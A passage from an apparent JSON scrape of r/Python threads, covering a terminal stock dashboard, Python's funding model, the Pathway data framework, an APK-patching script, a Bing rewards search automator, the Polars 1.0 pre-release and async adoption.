            "content": "A year ago I got a job at a small company. The software that gets sold there is over 20 years old and I thought about quitting and taking another position that was offered to me at a way bigger company. The old and grown code is exactly what you would expect from software that was extendet piece by piece. The fact that it is not really wirtten in python ways doesn't make it better. But the company is currently starting to modernize and changing processes and becoming modern. The nice thing in this project is that my boss throws me at a project and let me do my thing. Hell lot of freedom, many opportunities to get involved, many opportunities to learn stuff and a great group of people working together with me. Before that I was working in a datacenter automating processes which was fun because we got our own small replica of the datacenter infrastructure that was our playground."
        }
    ]
},
{
    "post_author": "jkwill87",
    "post_id": "hx9q9p",
    "post_score": "2611",
    "post_time": "Friday, July 24, 2020 at 11:45:33 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "A Command Line Stock Dashboard",
    "media": [
        "https://i.redd.it/uf086t7davc51.png",
        "https://preview.redd.it/uf086t7davc51.png?width=640&crop=smart&auto=webp&s=e37f4ff636cad6389e6a28ec61dbcc04e4a54dba"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "jkwill87",
            "score": "193",
            "content": "Hey r/python friends! I created a simple command line dashboard for monitoring stocks and wanted to share it. I was looking for something like the Apple stock app that was cross-platform and can run from the terminal or command prompt. I couldn't find anything like that so I decided to write my own Python package :) Like the Apple stocks app it gets stock information from Yahoo! Finance and provides a summary of stocks in your watch list. Additionally it works with international exchanges, other types of securities like crypocurrencies, and can give you an overview of your positions and the balance of your accounts. If you use the refresh argument or configuration option it will live update too. You can install it from PyPI by running pip3 install --user stonky. The source is available at https://github.com/jkwill87/stonky. Feedback and thoughts are welcome. Thanks!"
        },
        {
            "author": "Violin1990",
            "score": "53",
            "content": ""
        },
        {
            "author": "Uio443",
            "score": "107",
            "content": "Stonks"
        },
        {
            "author": "r_notfound",
            "score": "15",
            "content": "I just installed this and, configured it, and gave it a whirl. Nice! From quick usage, I would have two requests: Configurably allow sort order to be inverted (i.e. if I'm sorting by change, it would be nice to be able to put biggest gainers at the top, running to biggest losers at the bottom, as opposed to vice versa, as currently) Enable showing the position value in the POSITIONS table. So not just the P/L and %change for each position, but the final market value of that position."
        },
        {
            "author": "dm5228272",
            "score": "12",
            "content": "s t o n k y"
        },
        {
            "author": "[deleted]",
            "score": "5",
            "content": "I love people like this"
        },
        {
            "author": "jacquesdemolay1307",
            "score": "4",
            "content": "This is cool thanks so much! Will deff play around with it :)"
        },
        {
            "author": "Sacro",
            "score": "10",
            "content": "What font and terminal is that?"
        },
        {
            "author": "latest_ali",
            "score": "6",
            "content": "Can you mention what technologies have you used?"
        }
    ]
},
{
    "post_author": "Civil-Captain5676",
    "post_id": "1dimpim",
    "post_score": "0",
    "post_time": "Tuesday, June 18, 2024 at 12:44:19 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "How does Python earn money? What would have been their business model?",
    "media": [],
    "post_content": "I was wondering recently about any startup and any coding language that how does they make money. So I was curious to know about Python which is widely used",
    "comments": [
        {
            "author": "fortunatefaileur",
            "score": "305",
            "content": "You’ve misunderstood the world. The Python project itself is almost entirely volunteers (with a small number of people paid by a charity), some of whom are paid by their employer to volunteer. Trying to sell a language/compiler/runtime/etc has almost entirely ceased to exist as a business model.",
            "replies": [
                {
                    "author": "dgdio",
                    "score": "39",
                    "content": "SAS is the only language I can think of that is a paid business model. Most of the other languages are free but hardware manufacturers sold compilers",
                    "replies": [
                        {
                            "author": "ftmprstsaaimol2",
                            "score": "40",
                            "content": "MATLAB is still a big player in some industries.",
                            "replies": [
                                {
                                    "author": "BossOfTheGame",
                                    "score": "10",
                                    "content": "It has inertia, but like all proprietary systems, its days are ultimately limited."
                                }
                            ]
                        },
                        {
                            "author": "runed_golem",
                            "score": "13",
                            "content": "Matlab, Mathematica, and Maple still require paid licenses.",
                            "replies": [
                                {
                                    "author": "giants4210",
                                    "score": "6",
                                    "content": "Stata is big as well"
                                },
                                {
                                    "author": "ArtOfWarfare",
                                    "score": "4",
                                    "content": "Correct me if I’m wrong here, but the thing you’re buying isn’t the language. You’re buying a comprehensive IDE and useful but difficult to implement packages. Packages which have paid equivalents in other languages, too. It’s like saying that people buy Unity for UnityScript - no, you buy it for the IDE and all of the paid packages."
                                }
                            ]
                        },
                        {
                            "author": "Kinnayan",
                            "score": "5",
                            "content": "KDB+/q is another big one, but yes big market for hardware specific compilers, especially in FPGA land. I guess the other aspect was the Oracle model of incentivising adoption aggressively (which is largely credited as the reason for Java's ubiquity)"
                        },
                        {
                            "author": "pythosynthesis",
                            "score": "1",
                            "content": "Compilers can be for $$ though, and some times it makes sense to pay for them. Intel has a C++ compiler which can speed up certain simulations and other numerical calculations. I'm sure there's other examples."
                        }
                    ]
                }
            ]
        },
        {
            "author": "-jp-",
            "score": "69",
            "content": "Python is backed by a lot of groups, plus community support. The largest sponsors are listed at https://www.python.org/psf/sponsors/."
        },
        {
            "author": "ablativeyoyo",
            "score": "49",
            "content": "From the FAQ: The Foundation has three primary sources of income: The recently-introduced Associate Memberships (see the Associate Membership Page for more details) Donations from individuals and organizations with an interest in the language Profits from running the North American PyCon, a volunteer-run conference",
            "replies": [
                {
                    "author": "aqjo",
                    "score": "7",
                    "content": "Thanks for posting about the associate membership. Python helps me earn a living, so I was happy to join."
                }
            ]
        },
        {
            "author": "robberviet",
            "score": "22",
            "content": "Just like how any other programming language, they don't."
        },
        {
            "author": "asphias",
            "score": "41",
            "content": "Programming languages and open source software development are one of the best arguments against capitalism asking ''but how does it earn money?'' for everything.",
            "replies": [
                {
                    "author": "Glad-Lime-8049",
                    "score": "12",
                    "content": "Capitalists invest a ton into the open source community with the expectation of making money. They just make it in the uses of open source, not the direct creation and sale of the open source product."
                },
                {
                    "author": "balder1993",
                    "score": "12",
                    "content": "People may complain that those evolves slowly, some projects even seem stuck in time, but then at least they never get to the enshitification phase."
                }
            ]
        },
        {
            "author": "xiongchiamiov",
            "score": "4",
            "content": "Python is not a company, and so therefore it does not have a business model. The way most languages come about is that some programmer decides to fiddle with one, and so they create a language. This is done as a hobby on their free time. They work on it for a long time, then perhaps end up making it public, and maybe other language nerds also start using and working on it, again in their free time. Eventually, if it is very lucky and these folks stay dedicated to it for enough years, it becomes established enough that companies start using it, etc. Sometimes people are paid to create languages, either by a university (research) or a company (to solve a need they have). This generally jump starts the language because they can work on it more full-time, but otherwise almost certainly stays the same in terms of being open-source. Very rarely are languages proprietary and considered a part of a company's product (example in the past, .NET). Even more rarely are they the primary thing sold by the company. Because it has to be incredibly compelling for other companies to choose it over open-source alternatives."
        },
        {
            "author": "funkiestj",
            "score": "4",
            "content": "You might want to watch The Economics of Programming Languages.",
            "replies": [
                {
                    "author": "Additional-Tax-5643",
                    "score": "2",
                    "content": "Excellent presentation; thank you for posting it and tuning me into that account."
                }
            ]
        },
        {
            "author": "metaphorm",
            "score": "2",
            "content": "How does a hammer make money? Someone builds some furniture with it."
        }
    ]
},
{
    "post_author": "Clear_Celebration",
    "post_id": "jltffk",
    "post_score": "3025",
    "post_time": "Sunday, November 1, 2020 at 3:37:19 AM GMT+3",
    "flair_text": "Meta",
    "post_title": "I think it’s clear why I chose a Software Engineering career path instead of being an Artist",
    "media": [
        "https://i.redd.it/9hswsxs1yiw51.jpg",
        "https://preview.redd.it/9hswsxs1yiw51.jpg?width=640&crop=smart&auto=webp&s=63c1f3ecc1972b849341734e7f1222ae33949958"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "fedpri8888",
            "score": "176",
            "content": "I just realized the python logo are two pythons wtffff"
        },
        {
            "author": "400ampservice",
            "score": "57",
            "content": "Its not bad. I could clearly see what it was. I think a second coat would clean it up a bunch."
        },
        {
            "author": "alexge50",
            "score": "23",
            "content": "doesn't look bad, but uhh... i dont think that's how you carve pumpkins"
        },
        {
            "author": "Randomking333",
            "score": "43",
            "content": "PumpkinPy"
        },
        {
            "author": "jet_heller",
            "score": "25",
            "content": "Interesting that you are of that opinion. I used to be. Then I had several people in short order call me very artistic. Sure, I can't draw, paint or sculpt. But damn, I realized I can create coded solutions in the most beautiful ways I can dream. I am an artist. I just code creatively."
        },
        {
            "author": "savvy__steve",
            "score": "5",
            "content": "I understand completely. U should see the crappy one I did earlier."
        },
        {
            "author": "favorthebold",
            "score": "4",
            "content": "If you want to get your lines straighter next time, just use masking tape. That's how artists do it!"
        },
        {
            "author": "maybl8r99",
            "score": "4",
            "content": "It’s scary when you think that This pumpkin only works with python 2"
        },
        {
            "author": "inxt3",
            "score": "3",
            "content": "Python .....happy Halloween"
        },
        {
            "author": "[deleted]",
            "score": "3",
            "content": "Who needs a Gui anyway, good job."
        }
    ]
},
{
    "post_author": "dxtros",
    "post_id": "1dezxa3",
    "post_score": "33",
    "post_time": "Thursday, June 13, 2024 at 5:09:55 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Pathway - Build Mission Critical ETL and RAG in Python (used by NATO, F1)",
    "media": [
        "https://github.com/pathwaycom/pathway",
        "https://pathway.com/developers/showcases",
        "https://pathway.com/solutions/rag-pipelines#try-it-out"
    ],
    "post_content": "Hi Python data folks,\nI am excited to share Pathway, a Python data processing framework we built for ETL and RAG pipelines.\nhttps://github.com/pathwaycom/pathway\nWhat My Project Does\nWe started Pathway to solve event processing for IoT and geospatial indexing. Think freight train operations in unmapped depots bringing key merchandise from China to Europe. This was not something we could use Flink or Elastic for.\nThen we added more connectors for streaming ETL (Kafka, Postgres CDC…), data indexing (yay vectors!), and LLM wrappers for RAG. Today Pathway provides a data indexing layer for live data updates, stateless and stateful data transformations over streams, and retrieval of structured and unstructured data.\nPathway ships with a Python API and a Rust runtime based on Differential Dataflow to perform incremental computation. All the pipeline is kept in memory and can be easily deployed with Docker and Kubernetes (pipelines-as-code).\nWe built Pathway to support enterprises like F1 teams and processors of highly sensitive information to build mission-critical data pipelines. We do this by putting security and performance first. For example, you can build and deploy self-hosted RAG pipelines with local LLM models and Pathway’s in-memory vector index, so no data ever leaves your infrastructure. Pathway connectors and transformations work with live data by default, so you can avoid expensive reprocessing and rely on fresh data.\nYou can install Pathway with pip and Docker, and get started with templates and notebooks:\nhttps://pathway.com/developers/showcases\nWe also host demo RAG pipelines implemented 100% in Pathway, feel free to interact with their API endpoints:\nhttps://pathway.com/solutions/rag-pipelines#try-it-out\nWe'd love to hear what you think of Pathway!",
    "comments": [
        {
            "author": "thedeepself",
            "score": "9",
            "content": "What is RAG?",
            "replies": [
                {
                    "author": "dxtros",
                    "score": "8",
                    "content": "Retrieval Augmented Generation. Here it is about indexing your unstructured data for natural language queries. Sorry I cannot change the title in OP now..."
                }
            ]
        },
        {
            "author": "pmkiller",
            "score": "7",
            "content": "Do you store data in memoey or read it from a type of file. Of so which backend file are you using?",
            "replies": [
                {
                    "author": "dxtros",
                    "score": "4",
                    "content": "Data is stored in memory operationally, but persistence/cache goes on file backends. The persistence backend is configurable, S3 or local filesystem are currently the supported options. https://pathway.com/developers/user-guide/deployment/persistence",
                    "replies": [
                        {
                            "author": "pmkiller",
                            "score": "3",
                            "content": "Sure but the file format, what is it? Parquet/sqlite/csv etc?",
                            "replies": [
                                {
                                    "author": "dxtros",
                                    "score": "3",
                                    "content": "For now it's some homebrewed file structure that also allows for easy KV accesses if needed. The roadmap goal is to converge to a sequential Parquet file format, possibly with full Delta Lake compatibility."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "TA_poly_sci",
            "score": "4",
            "content": "Is this actually used by Nato and F1 teams or did you just \"design\" it to potentially do so?",
            "replies": [
                {
                    "author": "dxtros",
                    "score": "1",
                    "content": "Please see pathway.com for user/client \"success stories\" etc. We only list some of the use we know about or have contractualized."
                }
            ]
        },
        {
            "author": "allpauses",
            "score": "2",
            "content": "This is cool! Will try to use it in one of my portfolio projects!",
            "replies": [
                {
                    "author": "jch_pw",
                    "score": "3",
                    "content": "[Pathway CTO here] By all means please do and let us know how it worked for you!"
                }
            ]
        },
        {
            "author": "DigThatData",
            "score": "1",
            "content": "mission critical RAG lmao",
            "replies": [
                {
                    "author": "dxtros",
                    "score": "1",
                    "content": "Mostly in the document processing vertical. We are not talking chatbots here."
                }
            ]
        }
    ]
},
{
    "post_author": "ltlbwu",
    "post_id": "1dhfnl6",
    "post_score": "15",
    "post_time": "Sunday, June 16, 2024 at 10:49:24 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": " I created a script to automatically patch revanced",
    "media": [
        "https://github.com/anishomsy/autorevanced"
    ],
    "post_content": "What My Project Does\nAutoReVanced is a Python script that automates downloading and patching APKs using ReVanced patches from ApkPure. It's perfect for anyone wanting to patch their revanced app.\nTarget Audience\nSuitable for a fun side project or hobbyists, AutoReVanced is designed for anyone wanting to customize Android apps with ReVanced patches.\nComparison\nUnlike alternatives, AutoReVanced is automatic.\nGitHub: autorevanced",
    "comments": [
        {
            "author": "JSP777",
            "score": "3",
            "content": "This is really interesting. Usually I only update my revanced apps when they break, so not sure what the benefit is. But I will have a look nonetheless. Thank you",
            "replies": [
                {
                    "author": "ltlbwu",
                    "score": "3",
                    "content": "No problem! Any feedback would be appreciated!"
                }
            ]
        },
        {
            "author": "shinitakunai",
            "score": "4",
            "content": "Ok cool but what is Revanced?",
            "replies": [
                {
                    "author": "safesintesi",
                    "score": "7",
                    "content": "oh boy I have news for you. r/revancedapp"
                }
            ]
        }
    ]
},
{
    "post_author": "tycooperaow",
    "post_id": "abjuw4",
    "post_score": "2593",
    "post_time": "Tuesday, January 1, 2019 at 8:18:40 PM GMT+3",
    "flair_text": "",
    "post_title": "These two books changed my life in 2018!",
    "media": [
        "https://i.redd.it/dramdluyhu721.jpg",
        "https://preview.redd.it/dramdluyhu721.jpg?width=640&crop=smart&auto=webp&s=3c7f9c6fa2f0a5eb14dec75ba8f1cb10d9cfc82f"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "Mr_N1ce",
            "score": "175",
            "content": "How did they change your life? Serious question, I'm curious what you did with python and if you used it for personal projects or professionally. Also: I assume you liked the books, how are they compared to each other?"
        },
        {
            "author": "AlSweigart",
            "score": "24",
            "content": ":D (I wrote a bunch of stuff, but it all comes out really sappy and yet also not sappy enough to convey how much I appreciate and am grateful that people find my work happy. So I erased it and just posted the happy smiley face instead.)"
        },
        {
            "author": "svrohith9",
            "score": "48",
            "content": "I am going to change my life in 2019 using these books."
        },
        {
            "author": "MarlinsBB",
            "score": "27",
            "content": "I love seeing these books with bends and folds. Shows you that you actually used them! Hope your python endeavors are going well!"
        },
        {
            "author": "[deleted]",
            "score": "39",
            "content": "I've been using automate the boring stuff, but I haven't used fluent python yet. What are the general prereqs for it in your opinion?"
        },
        {
            "author": "mrpbennett",
            "score": "7",
            "content": "Awesome!! I have just got the automate the boring stuff course on udemy. I’m going to start that tomorrow my plan for 2019 is to become fluent “so to speak” in python."
        },
        {
            "author": "aleDonnertBR",
            "score": "12",
            "content": "How do you read this kind of books? In front of the computer and inputing the codes or in same peace places like train and read as a normal book? I just curious due to a difficult to read paper books in front of pc. I am studing python too, by the way. Thanks"
        },
        {
            "author": "[deleted]",
            "score": "7",
            "content": "What kind of things did you make?"
        },
        {
            "author": "avy0010",
            "score": "3",
            "content": "I have those in epub format hope they'll also change my life in 2019"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1dfdinp",
    "post_score": "1",
    "post_time": "Friday, June 14, 2024 at 3:00:50 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Friday Daily Thread: r/Python Meta and Free-Talk Fridays",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "AutoModerator",
    "post_id": "1dhkxbq",
    "post_score": "6",
    "post_time": "Monday, June 17, 2024 at 3:00:09 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Monday Daily Thread: Project ideas!",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "jumper_oj",
    "post_id": "j02ftz",
    "post_score": "2979",
    "post_time": "Saturday, September 26, 2020 at 11:32:29 AM GMT+3",
    "flair_text": "Image Processing",
    "post_title": "Trying to keep my Jump Rope and AI Skills on point! Made this application using OpenPose. Link to the Medium tutorial and the GitHub Repo in the thread.",
    "media": [
        "https://external-preview.redd.it/uoYW5K6Shv1nQQT8vz0ZXlb2yOOwPFUfmPmhW6aks3s.png?width=640&crop=smart&format=pjpg&auto=webp&s=908ec30e508ca35cd81101edc9ef70edb5d7e64e"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "PawarShubham3007",
            "score": "75",
            "content": "Thanks for sharing. Need this kinda article for my ongoing project.",
            "replies": [
                {
                    "author": "jumper_oj",
                    "score": "25",
                    "content": "Cleaner Pose Estimation using Open Pose Glad you liked it. Would be coming up with more articles shortly!"
                }
            ]
        },
        {
            "author": "jumper_oj",
            "score": "61",
            "content": "Medium Tutorial: Cleaner Pose Estimation using Open Pose Here's the GitHub Repo: https://github.com/Adityaojas/Pose-Estimation-Clean (Don't forget to star it if you like it :P) NOTE: The tutorials are essentially for getting familiar with the concepts of Pose Estimation and getting clean outputs using some level of post-processing. I'll be rolling out the code and tutorial for simple applications using Pose Estimation (including the jump counter) soon in continuation to the medium article, stay tuned if you'd like that! EDIT: 9 awards in a single day, guys I am totally overwhelmed, you made my day ❤🙌🏻 EDIT 2: Since the jumping is getting a lot of attention, I guess sharing my Insta link would be a good idea :P Lots of jump-roping there.. https://www.instagram.com/adityaojas/?hl=en"
        },
        {
            "author": "OMDB-PiLoT",
            "score": "29",
            "content": "What bothered me is the jumps count kept going around 1.14 mark when you weren't jumping. Anyways, will be going through the code this weekend. Well done Sharma ji!"
        }
    ]
},
{
    "post_author": "michael_david",
    "post_id": "hkr6u5",
    "post_score": "2583",
    "post_time": "Saturday, July 4, 2020 at 12:19:29 AM GMT+3",
    "flair_text": "Meta",
    "post_title": "Happy 4th of July from Chicago",
    "media": [
        "https://preview.redd.it/omo1c38dlp851.jpg?width=640&crop=smart&auto=webp&s=8f6e4e1af6baa0ecef21c3fd08393d01bdec1542",
        "https://i.redd.it/omo1c38dlp851.jpg"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "[deleted]",
            "score": "148",
            "content": "Who has a python Chicago flag AND a boat in the play pen?!?",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "99",
                    "content": "This guy for sure works for a trading firm or hedge fund."
                }
            ]
        },
        {
            "author": "Dizzybro",
            "score": "125",
            "content": "",
            "replies": [
                {
                    "author": "01dSAD",
                    "score": "128",
                    "content": ""
                }
            ]
        },
        {
            "author": "benign_said",
            "score": "91",
            "content": "Zen of python: #45 Flags, babes and boats - yolo()"
        }
    ]
},
{
    "post_author": "adityashrivastav",
    "post_id": "1da3dys",
    "post_score": "15",
    "post_time": "Friday, June 7, 2024 at 8:45:14 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Python script to automate Bing searches for reward generation",
    "media": [
        "https://github.com/aditya-shrivastavv/ranwcopy"
    ],
    "post_content": "What My Project Does\n(Link) Check this out : aditya-shrivastavv/ranwcopy\nPython program which generates random words and sentences and copy them to clipboard🗒️.\nI created a script to automate Bing searches for reward generation\n👍 Excellent command line experience.\n🙂 User friendly.\n🔊 Produces sound so you don't have to start at it.\n🔁 Auto copy to clipboard🗒️\n💡 Intuitive help menu\nTarget Audience\nAnyone who wants to quickly get points from bing searches under there daily limit\nComparison\nThis is no comparison, this is a very unique approch to the problem. You will find many browser extensions which claim to do the same thing, but they don't work like the search engine expects\nCommands\nHelp menu\nranwcopy -h\n#OR\nranwcopy --help\nStart generating words (10 default with 8 seconds gap)\nranwcopy\nGenerate 20 words with 9 seconds gap\nranwcopy -i 20 -g 9\n# or\nranwcopy --iterations 20 --timegap 9\nThis is a semi automatic script",
    "comments": [
        {
            "author": "Bluelight01",
            "score": "3",
            "content": "If this is related to Microsoft rewards I’m pretty sure this is against tos",
            "replies": [
                {
                    "author": "b0ne123",
                    "score": "8",
                    "content": "It is, but fuck them.",
                    "replies": [
                        {
                            "author": "adityashrivastav",
                            "score": "3",
                            "content": "🥲what does tos means? Its new for me",
                            "replies": [
                                {
                                    "author": "wannasleeponyourhams",
                                    "score": "2",
                                    "content": "terms of service"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "ypanagis",
            "score": "3",
            "content": "Looks interesting hope Bing is not blocking your script by detecting it as non-browser-based surfing. By the way the first command under the heading “help menu”, is rancopy -h, which is probably a typo.",
            "replies": [
                {
                    "author": "adityashrivastav",
                    "score": "5",
                    "content": "No, it doesn't, most of the work happens off browser only paste and enter key press event is simulated by javascript function. I'll fix the typo, thanks for highlighting"
                }
            ]
        },
        {
            "author": "PM_YOUR_FEET_PLEASE",
            "score": "1",
            "content": "Maybe slightly off topic, but I don't understand the concept of \"points for bing searches\". Would you mind explaining what that is exactly?",
            "replies": [
                {
                    "author": "adityashrivastav",
                    "score": "3",
                    "content": "For every search you get 3 points and there is a limit of 90 points. Points can be converted into gift cards and many other alternatives. I have obtained 500 Rupee gift card"
                }
            ]
        },
        {
            "author": "Astralnugget",
            "score": "1",
            "content": "Now let’s make a whole army of them"
        }
    ]
},
{
    "post_author": "marcogorelli",
    "post_id": "1decdu5",
    "post_score": "200",
    "post_time": "Wednesday, June 12, 2024 at 8:31:34 PM GMT+3",
    "flair_text": "News",
    "post_title": "Polars 1.0 will be out in a few weeks, but you can already install the pre-release!",
    "media": [
        "https://github.com/pola-rs/polars/releases/tag/py-1.0.0-alpha.1",
        "https://github.com/pola-rs/polars/issues"
    ],
    "post_content": "In a few weeks, Polars 1.0 will be out. How exciting!\nYou can already try out the pre-release by running:\n```\npip install -U --pre polars\n```\nIf you encounter any bugs, you can report them to https://github.com/pola-rs/polars/issues, so they can be fixed before 1.0 comes out.\nRelease notes: https://github.com/pola-rs/polars/releases/tag/py-1.0.0-alpha.1",
    "comments": [
        {
            "author": "Amgadoz",
            "score": "43",
            "content": "I'm really bummed that their value_counts method doesn't have a normalize option. Also, pandas is faster at loading large parquet file for me, although polars takes way less memory.",
            "replies": [
                {
                    "author": "ritchie46",
                    "score": "20",
                    "content": "I'm really bummed that their value_counts method doesn't have a normalize option. Here you go: https://github.com/pola-rs/polars/pull/16917 😉 Also, pandas is faster at loading large parquet file for me Pandas use `pyarrow`, which you can use in Polars as well if you want.",
                    "replies": [
                        {
                            "author": "madness_of_the_order",
                            "score": "15",
                            "content": "Did we just witness a year old issue being resolved in 12 hours because it was mentioned on reddit?",
                            "replies": [
                                {
                                    "author": "ultimately42",
                                    "score": "6",
                                    "content": "Feels like magic"
                                }
                            ]
                        }
                    ]
                },
                {
                    "author": "marcogorelli",
                    "score": "29",
                    "content": "looks like there's an issue about this, and judging by the number of upvotes, you're not the only one :wink: https://github.com/pola-rs/polars/issues/10127"
                },
                {
                    "author": "theelderbeever",
                    "score": "11",
                    "content": "Did you try with use_pyarrow=True as well and compare read times?"
                }
            ]
        },
        {
            "author": "guidenable",
            "score": "24",
            "content": "Ran into a bug with polars the other day where transformations on larger than ram data were unreliable…considering this is why I would use polars over pandas, it was quite disappointing",
            "replies": [
                {
                    "author": "ritchie46",
                    "score": "15",
                    "content": "The streaming API always had a big fat warning that it was experimental. Our streaming engine is completely reworked from scratch. That's not the part that goes 1.0. Polars is first and foremost and in-memory query engine and with the 1.0 release we include the API and the default engine. I think there is a misconception that Polars aims for data too big for pandas only. It aims for all data that fits on a single node's RAM. Polars aims to work on datasets similar sized to pandas and more. Larger than RAM is experimental and only covers much smaller parts of our API."
                },
                {
                    "author": "BaggiPonte",
                    "score": "9",
                    "content": "IIUC the streaming engine is being reworked from scratch. Yes sometimes it's a bit of a letdown. But still even without that Polars can manage bigger datasets than pandas, what tricks do you use?"
                },
                {
                    "author": "runawayasfastasucan",
                    "score": "4",
                    "content": "Hope you filed an issue at github 😊"
                }
            ]
        },
        {
            "author": "xinaked",
            "score": "21",
            "content": "prefer duckdb here having everything standardized to SQL (and in a file we can ship around) is amazing. trying to get non-engineers to read/learn/understand business logic in polars is expensive if not impossible they do solve somewhat different things, and even work together, however duckdb alone is chefskiss",
            "replies": [
                {
                    "author": "theelderbeever",
                    "score": "15",
                    "content": "Doesn't polars have a SQL context where you can do the same thing?"
                }
            ]
        }
    ]
},
{
    "post_author": "HistoricalCrow",
    "post_id": "1dhcdre",
    "post_score": "12",
    "post_time": "Sunday, June 16, 2024 at 8:18:16 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "abstract-factories - a simple framework for content creation pipelines",
    "media": [
        "https://refactoring.guru/design-patterns/abstract-factory",
        "https://github.com/ldunham1/abstract_factories/tree/main/examples",
        "https://youtu.be/3l5tgk8hRn4?si=c_jOZXq8WQqfE_C9",
        "https://github.com/ldunham1/abstract_factories",
        "https://pyblish.com/"
    ],
    "post_content": "Hey all, my project abstract_factories is up to gauge interest and primarily feedback.\nThe design goal is to make it easier to iterate on typical Content Creation pipeline tools (tool dev, rigging, validation, asset management etc) with a flexible framework to provide convenience, open and simple design and no dependencies (currently). It's an approach I've used a lot over the years and found it pretty versatile in production across numerous projects.\nKey features\nAuto-registration of matching items (types or instances) from any given path or python module.\nSimple or conditional item identifiers.\nVersioning.\nRecursive path searching (recursive module search in review).\nDynamic resolving and importing modules in packaged (supports relative importing).\nUsage Examples\nThere are a couple of simple examples given along with tests to cover all of the current features.\nWhat the project does\nIt's a convenience package for creating scalable tools and frameworks using Abstract Factory design pattern.\nTarget Audience\nDue to the solutions it's built for, it's aimed primarily at Technical Artists, Technical Animators, Pipeline and Tool Developers, but I'm interested in hearing about other possible applications.\nComparison\nCompared to other Factory and Abstract Factory convenience packages, mine is based on the work from this GDC talk. The direct abstract-factories currently comes with a few more conveniences I've found useful during production. The idea stems from boiling down Pyblish to something that became a little more reusable when writing frameworks as opposed to being the framework.\nSuggestions, questions, comments etc welcome.",
    "comments": [
        {
            "author": "tweak-wtf",
            "score": "1",
            "content": "VFX community go brrrr. Does this also support validator dependencies? Like in pyblish i can only configure the order of validators.",
            "replies": [
                {
                    "author": "HistoricalCrow",
                    "score": "2",
                    "content": "This is much less of a complete validation framework like Pyblish and more a large cog that can make such a thing easier to implement yourself. Validator order can be implemented however you'd want. The current simple validation example just uses the Validators from the registration order. You could have a method to derive order in the validator abstract or from your validation class as simple or as complex as you want. Personally, I prefer explicit anyway, so the Validators would be given as a list to be run. This would be validation order wouldn't have to be tied to any internally functionalities.",
                    "replies": [
                        {
                            "author": "tweak-wtf",
                            "score": "1",
                            "content": "Sounds really cool! Could i also implement dependencies on an `Extractor` for instance? I image something where i could write an `Extractor` that has dependencies on several `Validators` and maybe `Collectors`.",
                            "replies": [
                                {
                                    "author": "HistoricalCrow",
                                    "score": "2",
                                    "content": "Kinda like a preset or playlist of collectors and validators and actions? It's not really the purpose of the lib but for sure you could. Again though, this library doesn't provide this for you, it just adds a lot of convenience for each of these parts, the beauty will come from what you can do with it. For example, your main class that implements a factory for the collectors, validators and actions could have a simple serialise and deserialise method. The factories rebuild and what you need given the names (and versions) of what you want (the main purpose of a factory design)."
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    ]
},
{
    "post_author": "mcharytoniuk",
    "post_id": "1dbasxr",
    "post_score": "40",
    "post_time": "Saturday, June 8, 2024 at 10:32:23 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Async Python adoption?",
    "media": [],
    "post_content": "Are there any studies, large-scale polls, or anything about async coding adoption in Python?\nI wonder how widely the community accepts it, how widespread its usage is, and what the general sentiment is towards it.",
    "comments": [
        {
            "author": "AstronomerTerrible49",
            "score": "63",
            "content": "Due to the dominating advantage of asyncio on performance, it has become my default option whenever I’m doing network IO. From my experience, there is a quite vivid ecosystem in python asyncio, I find it quite easy to find async lib for database, MQ, s3, etc. Do note that if you want to use asyncio in your app, you should design your whole application with async interfaces from the start. It can be very tedious and error-prone to maintain both a synchronous and an asynchronous version of your codebase simultaneously. In cases where I cant find an async lib for my use case and I’m being too lazy to create my own at the moment, I would go back to threading, but this rarely happens. Edit for update: Asyncio is more performant than threading, but they are not mutually exclusive. When there is sync code you can't avoid, threading can prevent the synchronous code from blocking the event loop, allowing your async functions to switch context. When refactoring your whole codebase into async is not an option, you can apply techniques such as (AOP), (perhaps use decorator), to make your async code transparent to your sync code, and vice versa. checkout my project premier, a lib for throttling both sync and async functions using redis, to see what I mean in code.",
            "replies": [
                {
                    "author": "shinitakunai",
                    "score": "5",
                    "content": "Wait, does boto3 supports asyncio?",
                    "replies": [
                        {
                            "author": "collectablecat",
                            "score": "18",
                            "content": "No. Aioboto3 exists as an unofficial version but it causes some really annoying dependency headaches."
                        },
                        {
                            "author": "PhENTZ",
                            "score": "7",
                            "content": "https://pypi.org/project/aioboto3/"
                        },
                        {
                            "author": "spuds_in_town",
                            "score": "2",
                            "content": "Aiobotocore"
                        }
                    ]
                }
            ]
        },
        {
            "author": "Educational_Ice151",
            "score": "6",
            "content": ""
        },
        {
            "author": "riklaunim",
            "score": "15",
            "content": "It's used, you can look at github but it's not a global feature that would overtake non-async approaches. It's a strong niche."
        },
        {
            "author": "SmokierLemur51",
            "score": "4",
            "content": "I have been wondering why Quart isn’t more widely adopted than it currently is"
        },
        {
            "author": "tartare4562",
            "score": "6",
            "content": "I really tried to use it, but in the end I always go back to some implementation with threads. It has its advantages, first of all being a robust implementation that takes away all the conplex stuff associated with multithreading, and second of all It Is a standard for concurrent code. But I like messing with threads sooooo...."
        },
        {
            "author": "jteppinette",
            "score": "3",
            "content": "I have basically given up on Python Async and write any concurrent applications in Go. I have many Python productions apps written both sync and async, and I just can’t take how sloppy async is. If I had to write a new project that required python and concurrency, I would use gevent."
        },
        {
            "author": "Drevicar",
            "score": "10",
